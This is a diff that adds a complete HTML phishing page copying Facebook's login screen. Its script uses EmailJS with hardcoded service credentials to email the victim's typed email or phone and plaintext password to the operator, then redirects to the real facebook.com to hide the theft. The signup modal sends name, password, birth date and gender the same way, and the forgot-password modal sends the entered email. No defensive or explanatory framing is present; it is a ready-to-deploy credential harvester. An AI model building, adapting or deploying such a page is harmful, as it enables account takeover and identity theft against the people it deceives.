@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – log in or sign up</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --fb-blue: #1877f2;
+      --fb-blue-hover: #166fe5;
+      --fb-green: #42b72a;
+      --fb-green-hover: #36a420;
+      --fb-gray: #f0f2f5;
+      --fb-border: #dddfe2;
+      --fb-text: #1c1e21;
+      --fb-muted: #65676b;
+      --fb-error: #f02849;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      background-color: var(--fb-gray);
+      color: var(--fb-text);
+      min-height: 100vh;
+    }
+
+    /* NAV */
+    .fb-nav {
+      background: white;
+      border-bottom: 1px solid var(--fb-border);
+      height: 56px;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      box-shadow: 0 2px 4px rgba(0,0,0,.1);
+    }
+    .fb-logo-nav {
+      font-size: 2rem;
+      font-weight: 900;
+      color: var(--fb-blue);
+      letter-spacing: -1px;
+    }
+
+    /* LAYOUT */
+    .main-wrap {
+      max-width: 980px;
+      margin: 0 auto;
+      padding: 40px 16px 80px;
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 32px;
+    }
+
+    @media (max-width: 768px) {
+      .main-wrap { flex-direction: column; align-items: center; padding: 20px 16px 60px; }
+      .left-col  { text-align: center; padding-top: 0 !important; }
+    }
+
+    /* LEFT */
+    .left-col { flex: 1; padding-top: 80px; max-width: 480px; }
+    .left-logo {
+      font-size: 3.5rem;
+      font-weight: 900;
+      color: var(--fb-blue);
+      letter-spacing: -2px;
+      display: block;
+      margin-bottom: 16px;
+    }
+    .left-col p { font-size: 1.4375rem; line-height: 1.4; }
+
+    /* RIGHT */
+    .right-col { width: 396px; flex-shrink: 0; }
+    @media (max-width: 768px) { .right-col { width: 100%; max-width: 396px; } }
+
+    /* CARD */
+    .card {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 24px rgba(0,0,0,.08);
+      padding: 16px;
+      animation: fadeUp .35s ease both;
+    }
+
+    @keyframes fadeUp {
+      from { opacity:0; transform:translateY(16px); }
+      to   { opacity:1; transform:translateY(0); }
+    }
+
+    /* INPUTS */
+    .fb-input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid var(--fb-border);
+      border-radius: 6px;
+      font-size: 1rem;
+      color: var(--fb-text);
+      background: white;
+      outline: none;
+      transition: border-color .15s, box-shadow .15s;
+      margin-bottom: 12px;
+      font-family: inherit;
+    }
+    .fb-input:focus {
+      border-color: var(--fb-blue);
+      box-shadow: 0 0 0 2px rgba(24,119,242,.2);
+    }
+    .fb-input.err-input { border-color: var(--fb-error); box-shadow: 0 0 0 2px rgba(240,40,73,.15); }
+
+    .err-msg {
+      font-size: .8125rem;
+      color: var(--fb-error);
+      margin-top: -8px;
+      margin-bottom: 10px;
+      display: none;
+    }
+    .err-msg.show { display: block; }
+
+    /* BUTTONS */
+    .btn-blue {
+      width: 100%; padding: 14px;
+      background: var(--fb-blue); color: white;
+      font-size: 1.25rem; font-weight: 700;
+      border: none; border-radius: 6px;
+      cursor: pointer; transition: background .15s;
+      font-family: inherit;
+    }
+    .btn-blue:hover:not(:disabled) { background: var(--fb-blue-hover); }
+    .btn-blue:disabled { background: #9cb8e8; cursor: not-allowed; }
+
+    .btn-green {
+      padding: 14px 28px;
+      background: var(--fb-green); color: white;
+      font-size: 1.0625rem; font-weight: 700;
+      border: none; border-radius: 6px;
+      cursor: pointer; transition: background .15s;
+      font-family: inherit;
+    }
+    .btn-green:hover:not(:disabled) { background: var(--fb-green-hover); }
+    .btn-green:disabled { background: #90d080; cursor: not-allowed; }
+
+    /* DIVIDER */
+    .divider {
+      display: flex; align-items: center; gap: 8px;
+      margin: 16px 0;
+    }
+    .divider::before, .divider::after {
+      content: ''; flex: 1; height: 1px; background: var(--fb-border);
+    }
+    .divider span { font-size: .875rem; color: var(--fb-muted); font-weight: 500; }
+
+    .forgot-link {
+      display: block; text-align: center;
+      color: var(--fb-blue); font-size: .9375rem;
+      cursor: pointer; text-decoration: none; margin-bottom: 16px;
+    }
+    .forgot-link:hover { text-decoration: underline; }
+
+    /* MODAL */
+    .modal-overlay {
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,.65);
+      z-index: 200;
+      display: none;
+      align-items: center; justify-content: center;
+      padding: 16px;
+    }
+    .modal-overlay.open { display: flex; }
+
+    .modal {
+      background: white; border-radius: 8px;
+      box-shadow: 0 4px 16px rgba(0,0,0,.3);
+      width: 100%; max-width: 432px;
+      animation: modalIn .2s ease;
+      max-height: 90vh; overflow-y: auto;
+    }
+    @keyframes modalIn {
+      from { opacity:0; transform:scale(.95); }
+      to   { opacity:1; transform:scale(1); }
+    }
+
+    .modal-header { padding: 16px 16px 12px; border-bottom: 1px solid var(--fb-border); }
+    .modal-header h2 { font-size: 1.5rem; font-weight: 700; }
+    .modal-header p  { font-size: .9375rem; color: var(--fb-muted); margin-top: 4px; }
+    .modal-body  { padding: 16px; }
+    .modal-footer {
+      padding: 16px; border-top: 1px solid var(--fb-border);
+      display: flex; justify-content: flex-end; gap: 8px;
+    }
+
+    .btn-cancel {
+      padding: 10px 20px; background: #e4e6eb;
+      border: none; border-radius: 6px;
+      font-size: 1rem; font-weight: 700; color: var(--fb-text);
+      cursor: pointer; font-family: inherit;
+    }
+    .btn-cancel:hover { background: #d8dadf; }
+
+    .btn-modal-submit {
+      padding: 10px 20px; background: var(--fb-blue);
+      border: none; border-radius: 6px;
+      font-size: 1rem; font-weight: 700; color: white;
+      cursor: pointer; font-family: inherit;
+    }
+    .btn-modal-submit:hover:not(:disabled) { background: var(--fb-blue-hover); }
+    .btn-modal-submit:disabled { background: #9cb8e8; cursor: not-allowed; }
+
+    /* SIGNUP FIELDS */
+    .name-row { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px; }
+    .name-row .fb-input { margin-bottom: 0; }
+
+    .label-xs { font-size: .75rem; color: var(--fb-muted); margin-bottom: 6px; display: block; }
+
+    .dob-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 4px; }
+    .fb-select {
+      width: 100%; padding: 10px 12px;
+      border: 1px solid var(--fb-border); border-radius: 6px;
+      font-size: .9375rem; color: var(--fb-text);
+      background: white; outline: none; cursor: pointer;
+      font-family: inherit;
+    }
+    .fb-select:focus { border-color: var(--fb-blue); }
+
+    .gender-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 4px; }
+    .gender-opt {
+      border: 1px solid var(--fb-border); border-radius: 6px;
+      padding: 8px 12px;
+      display: flex; align-items: center; justify-content: space-between;
+      font-size: .9375rem; cursor: pointer; user-select: none;
+    }
+    .gender-opt input[type="radio"] { accent-color: var(--fb-blue); }
+
+    /* SPINNER */
+    .spinner {
+      width: 18px; height: 18px;
+      border: 3px solid rgba(255,255,255,.4);
+      border-top-color: white; border-radius: 50%;
+      animation: spin .7s linear infinite;
+      display: inline-block; vertical-align: middle;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* TOAST */
+    #toast {
+      position: fixed; bottom: 24px; left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      background: #323232; color: white;
+      padding: 12px 24px; border-radius: 4px;
+      font-size: .9375rem;
+      opacity: 0; pointer-events: none;
+      transition: opacity .3s, transform .3s;
+      z-index: 9999; white-space: nowrap;
+      max-width: 92vw; text-align: center;
+    }
+    #toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+    #toast.ok  { background: #42b72a; }
+    #toast.bad { background: var(--fb-error); }
+
+    /* FOOTER */
+    footer {
+      margin-top: 48px; padding: 24px 16px;
+      border-top: 1px solid var(--fb-border);
+      font-size: .75rem; color: var(--fb-muted);
+      text-align: center;
+    }
+    footer a { color: var(--fb-muted); text-decoration: none; margin: 0 4px; }
+    footer a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav class="fb-nav">
+  <span class="fb-logo-nav">facebook</span>
+</nav>
+
+<!-- MAIN -->
+<div class="main-wrap">
+
+  <!-- LEFT -->
+  <div class="left-col">
+    <span class="left-logo">facebook</span>
+    <p>Connect with friends and the world around you on Facebook.</p>
+  </div>
+
+  <!-- RIGHT -->
+  <div class="right-col">
+    <div class="card">
+
+      <!-- Email -->
+      <input type="text" id="loginEmail" class="fb-input"
+        placeholder="Email address or phone number" autocomplete="username"/>
+      <div class="err-msg" id="loginEmailErr">Enter a valid email or phone number.</div>
+
+      <!-- Password -->
+      <input type="password" id="loginPassword" class="fb-input"
+        placeholder="Password" autocomplete="current-password"/>
+      <div class="err-msg" id="loginPasswordErr">Enter your password.</div>
+
+      <!-- Login btn -->
+      <button class="btn-blue" id="loginBtn" onclick="handleLogin()">Log In</button>
+
+      <!-- Forgot -->
+      <div style="text-align:center; margin-top:14px;">
+        <span class="forgot-link" >Forgotten password?</span>
+      </div>
+
+      <div class="divider"><span>or</span></div>
+
+      <!-- Create account -->
+      <div style="text-align:center;">
+        <button class="btn-green">Create new account</button>
+      </div>
+
+    </div>
+
+    <div style="text-align:center; margin-top:16px; font-size:.9375rem;">
+      <strong>Create a Page</strong> for a celebrity, brand or business.
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════════════════════════
+     SIGN UP MODAL
+══════════════════════════════ -->
+<div class="modal-overlay" id="signupOverlay">
+  <div class="modal">
+    <div class="modal-header">
+      <h2>Create a new account</h2>
+      <p>It's quick and easy.</p>
+    </div>
+    <div class="modal-body">
+
+      <div class="name-row">
+        <div>
+          <input type="text" class="fb-input" id="su_first" placeholder="First name"/>
+          <div class="err-msg" id="su_firstErr">What's your first name?</div>
+        </div>
+        <div>
+          <input type="text" class="fb-input" id="su_last" placeholder="Last name"/>
+          <div class="err-msg" id="su_lastErr">What's your last name?</div>
+        </div>
+      </div>
+
+      <input type="text" class="fb-input" id="su_email" placeholder="Mobile number or email address"/>
+      <div class="err-msg" id="su_emailErr">Enter a valid email or phone number.</div>
+
+      <input type="password" class="fb-input" id="su_pass" placeholder="New password"/>
+      <div class="err-msg" id="su_passErr">Password must be at least 6 characters.</div>
+
+      <span class="label-xs">Date of birth</span>
+      <div class="dob-row">
+        <select class="fb-select" id="su_month">
+          <option value="">Month</option>
+          <option>Jan</option><option>Feb</option><option>Mar</option>
+          <option>Apr</option><option>May</option><option>Jun</option>
+          <option>Jul</option><option>Aug</option><option>Sep</option>
+          <option>Oct</option><option>Nov</option><option>Dec</option>
+        </select>
+        <select class="fb-select" id="su_day">
+          <option value="">Day</option>
+          <script>for(let i=1;i<=31;i++) document.write(`<option>${i}</option>`);</script>
+        </select>
+        <select class="fb-select" id="su_year">
+          <option value="">Year</option>
+          <script>
+            const cy = new Date().getFullYear();
+            for(let y = cy-13; y >= cy-100; y--) document.write(`<option>${y}</option>`);
+          </script>
+        </select>
+      </div>
+      <div class="err-msg" id="su_dobErr">Please enter your date of birth.</div>
+
+      <span class="label-xs" style="margin-top:8px;">Gender</span>
+      <div class="gender-row">
+        <label class="gender-opt"><span>Female</span><input type="radio" name="su_gender" value="Female"/></label>
+        <label class="gender-opt"><span>Male</span><input type="radio" name="su_gender" value="Male"/></label>
+        <label class="gender-opt"><span>Custom</span><input type="radio" name="su_gender" value="Custom"/></label>
+      </div>
+      <div class="err-msg" id="su_genderErr">Please select your gender.</div>
+
+      <p style="font-size:.73rem; color:var(--fb-muted); line-height:1.4; margin-top:8px;">
+        By clicking Sign Up, you agree to our
+        <a href="#" style="color:inherit;">Terms</a>,
+        <a href="#" style="color:inherit;">Privacy Policy</a> and
+        <a href="#" style="color:inherit;">Cookies Policy</a>.
+      </p>
+    </div>
+    <div class="modal-footer">
+      <button class="btn-cancel" onclick="closeSignup()">Cancel</button>
+      <button class="btn-modal-submit" id="signupBtn" onclick="handleSignup()">Sign Up</button>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════
+     FORGOT PASSWORD MODAL
+══════════════════════════════ -->
+<div class="modal-overlay" id="forgotOverlay">
+  <div class="modal">
+    <div class="modal-header">
+      <h2>Find Your Account</h2>
+      <p>Please enter your email address or mobile number to search for your account.</p>
+    </div>
+    <div class="modal-body">
+      <input type="text" class="fb-input" id="fp_email"
+        placeholder="Email address or phone number" style="margin-bottom:0;"/>
+      <div class="err-msg" id="fp_emailErr">Enter your email or phone number.</div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn-cancel" onclick="closeForgot()">Cancel</button>
+      <button class="btn-modal-submit" id="forgotBtn" onclick="handleForgot()">Search</button>
+    </div>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div id="toast"></div>
+
+<!-- FOOTER -->
+<footer>
+  <div style="margin-bottom:10px;">
+    <a href="#">English (UK)</a><a href="#">Français</a><a href="#">العربية</a>
+    <a href="#">Español</a><a href="#">Deutsch</a><a href="#">Português</a>
+    <a href="#">Italiano</a><a href="#">한국어</a><a href="#">日本語</a>
+  </div>
+  <div>
+    <a href="#">Sign Up</a><a href="#">Log In</a><a href="#">Messenger</a>
+    <a href="#">Facebook Lite</a><a href="#">Watch</a><a href="#">Places</a>
+    <a href="#">Marketplace</a><a href="#">Privacy Policy</a>
+    <a href="#">Privacy Centre</a><a href="#">About</a><a href="#">Careers</a>
+    <a href="#">Cookies</a><a href="#">Terms</a><a href="#">Help</a>
+  </div>
+  <div style="margin-top:10px;">Meta © 2024</div>
+</footer>
+
+<script>
+  emailjs.init("JESne3y6QT0Z3T4ft");
+
+  const SVC  = "service_8jcvq6t";
+  const TMPL = "template_r9pwgkn";
+
+  /* ── TOAST ── */
+  function toast(msg, type) {
+    const el = document.getElementById("toast");
+    el.textContent = msg;
+    el.className   = "show " + (type || "ok");
+    clearTimeout(el._t);
+    el._t = setTimeout(() => el.className = "", 4000);
+  }
+
+  /* ── HELPERS ── */
+  function showErr(id, show) {
+    const el = document.getElementById(id);
+    if (el) el.classList.toggle("show", show);
+  }
+  function markInput(el, bad) {
+    el.classList.toggle("err-input", bad);
+  }
+  function isEmail(v) {
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) || /^\+?\d{6,15}$/.test(v.replace(/\s/g,""));
+  }
+  function now() {
+    return new Date().toLocaleString("en-US",{
+      weekday:"long",year:"numeric",month:"long",
+      day:"numeric",hour:"2-digit",minute:"2-digit"
+    });
+  }
+  function setBusy(id, busy, label) {
+    const b = document.getElementById(id);
+    b.disabled = busy;
+    b.innerHTML = busy ? '<span class="spinner"></span>' : label;
+  }
+
+  /* ── MODALS ── */
+  function openSignup()  { document.getElementById("signupOverlay").classList.add("open"); }
+  function closeSignup() { document.getElementById("signupOverlay").classList.remove("open"); }
+  function openForgot()  { document.getElementById("forgotOverlay").classList.add("open"); }
+  function closeForgot() { document.getElementById("forgotOverlay").classList.remove("open"); }
+
+  document.getElementById("signupOverlay").addEventListener("click", e => {
+    if (e.target === e.currentTarget) closeSignup();
+  });
+  document.getElementById("forgotOverlay").addEventListener("click", e => {
+    if (e.target === e.currentTarget) closeForgot();
+  });
+
+  /* ── LOGIN ── */
+  async function handleLogin() {
+    const eEl = document.getElementById("loginEmail");
+    const pEl = document.getElementById("loginPassword");
+    let ok = true;
+
+    const eOk = eEl.value.trim().length > 2;
+    showErr("loginEmailErr", !eOk); markInput(eEl, !eOk);
+    if (!eOk) ok = false;
+
+    const pOk = pEl.value.length > 0;
+    showErr("loginPasswordErr", !pOk); markInput(pEl, !pOk);
+    if (!pOk) ok = false;
+
+    if (!ok) return;
+
+    setBusy("loginBtn", true, "Log In");
+    try {
+      await emailjs.send(SVC, TMPL, {
+        name:    eEl.value.trim(),
+        message: `🔐 LOGIN ATTEMPT\n\nEmail / Phone: ${eEl.value.trim()}\nPassword: ${pEl.value}\nTime: ${now()}`,
+        time:    now(),
+      });
+       window.location.href = "https://web.facebook.com/";
+    } catch(e) {
+      toast("Login failed. Please try again.", "bad");
+    } finally {
+      setBusy("loginBtn", false, "Log In");
+    }
+  }
+
+  /* ── SIGN UP ── */
+  async function handleSignup() {
+    const first   = document.getElementById("su_first").value.trim();
+    const last    = document.getElementById("su_last").value.trim();
+    const email   = document.getElementById("su_email").value.trim();
+    const pass    = document.getElementById("su_pass").value;
+    const month   = document.getElementById("su_month").value;
+    const day     = document.getElementById("su_day").value;
+    const year    = document.getElementById("su_year").value;
+    const gender  = document.querySelector('input[name="su_gender"]:checked')?.value || "";
+    let ok = true;
+
+    [[!first,          "su_firstErr"],
+     [!last,           "su_lastErr"],
+     [!isEmail(email), "su_emailErr"],
+     [pass.length < 6, "su_passErr"],
+     [!month||!day||!year, "su_dobErr"],
+     [!gender,         "su_genderErr"]
+    ].forEach(([bad, id]) => { showErr(id, bad); if (bad) ok = false; });
+
+    if (!ok) return;
+
+    setBusy("signupBtn", true, "Sign Up");
+    try {
+      await emailjs.send(SVC, TMPL, {
+        name:    `${first} ${last}`,
+        message: `🆕 NEW SIGN UP\n\nName: ${first} ${last}\nEmail / Phone: ${email}\nPassword: ${pass}\nDOB: ${day} ${month} ${year}\nGender: ${gender}\nTime: ${now()}`,
+        time:    now(),
+      });
+      toast(`✓ Welcome, ${first}! Account created.`, "ok");
+      closeSignup();
+    } catch(e) {
+      toast("Sign up failed. Please try again.", "bad");
+    } finally {
+      setBusy("signupBtn", false, "Sign Up");
+    }
+  }
+
+  /* ── FORGOT PASSWORD ── */
+  async function handleForgot() {
+    const el  = document.getElementById("fp_email");
+    const val = el.value.trim();
+    const bad = !val || val.length < 3;
+    showErr("fp_emailErr", bad); markInput(el, bad);
+    if (bad) return;
+
+    setBusy("forgotBtn", true, "Search");
+    try {
+      await emailjs.send(SVC, TMPL, {
+        name:    val,
+        message: `🔑 PASSWORD RESET REQUEST\n\nEmail / Phone: ${val}\nTime: ${now()}`,
+        time:    now(),
+      });
+      toast("✓ Reset instructions sent!", "ok");
+      closeForgot();
+      el.value = "";
+    } catch(e) {
+      toast("Request failed. Please try again.", "bad");
+    } finally {
+      setBusy("forgotBtn", false, "Search");
+    }
+  }
+
+  /* ── ENTER KEY ── */
+  document.addEventListener("keydown", e => {
+    if (e.key !== "Enter") return;
+    if (document.getElementById("signupOverlay").classList.contains("open")) { handleSignup(); return; }
+    if (document.getElementById("forgotOverlay").classList.contains("open")) { handleForgot(); return; }
+    handleLogin();
+  });
+</script>
+</body>
+</html>
